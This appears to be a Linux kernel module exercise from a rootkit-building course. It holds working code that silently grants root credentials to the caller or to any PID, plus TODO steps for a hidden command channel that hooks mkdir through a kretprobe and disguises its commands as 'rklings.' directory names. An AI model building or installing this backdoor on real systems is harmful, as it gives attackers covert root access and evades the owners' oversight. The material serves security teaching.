// SPDX-License-Identifier: GPL-2.0
//
// Your task: upgrade from kprobe to kretprobe and build a command
// dispatcher. Fill in every TODO below. See README for details.
//
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static unsigned int escalation_count;
static int deferred_pid;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = find_task_by_vpid(pid);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

// TODO: Write rk_cmd_ping(const char *arg)
// - pr_info("rklings: dispatch: cmd=ping\n")
// - Return 0

// TODO: Write rk_cmd_status(const char *arg)
// - pr_info with escalation_count and deferred_pid
// - Return 0

// TODO: Write rk_cmd_escalate(const char *arg)
// - If arg is NULL, call rk_escalate()
// - Otherwise parse arg as PID with kstrtoint
// - Call rk_escalate_pid, defer if -ESRCH

// TODO: Write rk_dispatch(const char *name)
// - Skip past RK_PREFIX to get suffix
// - Find first dot in suffix with strchr
// - Split into cmd (before dot) and arg (after dot, or NULL)
// - Compare cmd_len and string to dispatch:
//   "e" -> rk_cmd_escalate, "ping" -> rk_cmd_ping,
//   "status" -> rk_cmd_status
// - Return -ENOENT for unknown commands

// TODO: Define struct rk_mkdir_data { int result; bool intercepted; }

// TODO: Write rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
// - Cast inst->data to struct rk_mkdir_data
// - Set intercepted = false
// - Extract inner pt_regs: regs_get_kernel_argument(regs, 0)
// - Read pathname from uregs->di with strncpy_from_user
// - Find basename with strrchr(buf, '/')
// - Check "rklings." prefix
// - Call rk_dispatch(base), store result
// - put_user('\0', pathname) to suppress the real mkdir
// - Set intercepted = true

// TODO: Write rk_mkdir_return(struct kretprobe_instance *inst, struct pt_regs *regs)
// - If intercepted, regs_set_return_value(regs, result)

// TODO: Define struct kretprobe rk_mkdir_probe with:
// - .kp.symbol_name = "__x64_sys_mkdir"
// - .entry_handler  = rk_mkdir_entry
// - .handler        = rk_mkdir_return
// - .data_size      = sizeof(struct rk_mkdir_data)
// - .maxactive      = 8

static int rk_proc_show(struct seq_file *m, void *v)
{
	rk_try_deferred();
	if (deferred_pid > 0)
		seq_printf(m, "deferred: %d\n", deferred_pid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	return 0;
}

static int __init rk_init(void)
{
	// TODO: register_kretprobe(&rk_mkdir_probe)
	// TODO: proc_create_single("rklings", 0444, NULL, rk_proc_show)
	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: remove_proc_entry("rklings", NULL)
	// TODO: unregister_kretprobe(&rk_mkdir_probe)
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
